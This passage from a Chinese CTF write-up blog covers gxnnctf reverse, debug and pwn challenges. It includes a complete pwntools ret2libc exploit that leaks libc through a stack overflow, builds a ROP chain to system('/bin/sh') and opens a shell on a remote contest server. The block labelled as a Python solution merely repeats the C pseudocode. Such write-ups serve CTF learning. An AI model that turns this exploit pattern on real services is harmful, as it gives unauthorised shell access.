<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">str1 = &quot;j8Ym6wIH0nar4P3c7EHq&quot;</span><br><span class="line">current = [0x6 ,0x57,0x3E,0x0A,0x53,0x13,0x16,0x21,0x5E,0x31,0x0C,0x0B,0x6B,0x22,0x56,0x15,0x52,0x37,0x3B,0x14]</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for x in range(len(current)):</span><br><span class="line">	flag += chr(ord(str1[x])^current[x])</span><br><span class="line"></span><br><span class="line">print &quot;gxnnctf&#123;&quot;+flag+&quot;&#125;&quot;</span><br></pre></td></tr></table></figure>
<p>flag：gxnnctf{logged_in_my_reverse}</p>
<h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><p>题目提供的文件是一个损坏的ELF文件，当时我也是只想着怎么把这个文件给修复好，到最后也没有找到办法，看了WP后才发现根本就不用恢复！ orz<br>通过IDA载入，会出现很多提示，直接全部yes过去即可，通过代码审计发现sub_080484C0函数是关于flag的算法，也不是太难；</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">for ( i = 0; i &lt;= 26; ++i )</span><br><span class="line">  *(&amp;v13 + i) ^= *(&amp;v5 + 4 * (i % 3));</span><br><span class="line">for ( j = 0; j &lt;= 26; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  if ( *(&amp;v13 + j) &lt;= 47 || *(&amp;v13 + j) &gt; 57 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *(&amp;v13 + j) &lt;= 64 || *(&amp;v13 + j) &gt; 90 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( *(&amp;v13 + j) &lt;= 96 || *(&amp;v13 + j) &gt; 122 )</span><br><span class="line">        v11[j] = *(&amp;v13 + j) + 1;</span><br><span class="line">      else</span><br><span class="line">        v11[j] = *(&amp;v13 + j) - 32;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      v11[j] = *(&amp;v13 + j) + 32;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v11[j] = (*(&amp;v13 + j) - 53) % 10 + 48;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>通过python实现算法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">for ( i = 0; i &lt;= 26; ++i )</span><br><span class="line">  *(&amp;v13 + i) ^= *(&amp;v5 + 4 * (i % 3));</span><br><span class="line">for ( j = 0; j &lt;= 26; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  if ( *(&amp;v13 + j) &lt;= 47 || *(&amp;v13 + j) &gt; 57 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *(&amp;v13 + j) &lt;= 64 || *(&amp;v13 + j) &gt; 90 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( *(&amp;v13 + j) &lt;= 96 || *(&amp;v13 + j) &gt; 122 )</span><br><span class="line">        v11[j] = *(&amp;v13 + j) + 1;</span><br><span class="line">      else</span><br><span class="line">        v11[j] = *(&amp;v13 + j) - 32;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      v11[j] = *(&amp;v13 + j) + 32;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v11[j] = (*(&amp;v13 + j) - 53) % 10 + 48;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<p>flag：gxnnctf{Are_y0u_us1ng_gdb?}</p>
<h3 id="pwn-x64"><a href="#pwn-x64" class="headerlink" title="pwn_x64"></a>pwn_x64</h3><p>基本的栈溢出，先泄露处基地址，然后通过提供的libc文件找到system地址和“/bin/sh”的地址，进而构造ROP去pwn掉程序。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">r = remote(&quot;47.106.209.151&quot;,55555)</span><br><span class="line">pwn_elf = ELF(&quot;./pwn_x64&quot;)</span><br><span class="line">so_elf = ELF(&quot;./x64_libc.so.6&quot;)</span><br><span class="line">offset = 0x88</span><br><span class="line">start = pwn_elf.symbols[&quot;_start&quot;]</span><br><span class="line"></span><br><span class="line">read_got = pwn_elf.got[&apos;read&apos;]</span><br><span class="line">print &quot;read_got -&gt; &quot;+hex(read_got)</span><br><span class="line">write_plt = pwn_elf.plt[&apos;write&apos;]</span><br><span class="line">print &quot;write_plt -&gt; &quot;+hex(write_plt)</span><br><span class="line">so_read_addr = so_elf.symbols[&apos;read&apos;]</span><br><span class="line">print &quot;so_read_addr -&gt; &quot;+hex(so_read_addr)</span><br><span class="line">#pop</span><br><span class="line">pop_rdi_ret = 0x400633</span><br><span class="line">pop_rsi_r15_ret = 0x400631</span><br><span class="line">print r.recv()</span><br><span class="line">#write(1,got_addr,8)</span><br><span class="line">payload = &quot;a&quot;*offset+p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_r15_ret)+p64(read_got)+p64(1)+p64(write_plt)+p64(start)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">read_real_addr = eval(hex(u64(r.recv()[:8])))</span><br><span class="line">print r.recv()</span><br><span class="line">print &quot;read_real_addr -&gt; &quot;+hex(read_real_addr)</span><br><span class="line">so_system_addr = so_elf.symbols[&apos;system&apos;]</span><br><span class="line">print &quot;so_system_addr -&gt; &quot;+hex(so_system_addr)</span><br><span class="line">so_binsh_addr = 0x18cd57</span><br><span class="line">print &quot;so_binsh_addr -&gt; &quot;+hex(so_binsh_addr)</span><br><span class="line">#so表地址</span><br><span class="line">so_read_addr = 0xf7250</span><br><span class="line">#基地址</span><br><span class="line">base_addr = read_real_addr- so_read_addr</span><br><span class="line">print &quot;base_addr -&gt; &quot;+hex(base_addr)</span><br><span class="line">system_real_addr = base_addr+so_system_addr</span><br><span class="line">binsh_real_addr = base_addr+so_binsh_addr</span><br><span class="line">print &quot;system_real_addr -&gt; &quot;+hex(system_real_addr)</span><br><span class="line">print &quot;binsh_real_addr -&gt; &quot;+hex(binsh_real_addr)</span><br><span class="line">payload = &quot;a&quot;*offset+p64(pop_rdi_ret)+p64(binsh_real_addr)+p64(system_real_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">sleep(0.1)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>flag：flag{gTSbRZsbn5tPLchsZ0bNoRo3UeByXjkacSdE}</p>
<h3 id="format"><a href="#format" class="headerlink" title="format"></a>format</h3><p>这个题是盲打，利用姿势还没搞懂！</p>

        
        <br>
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
        本站总访问量<span id="busuanzi_value_site_pv"></span>次
       </p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "search.json"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
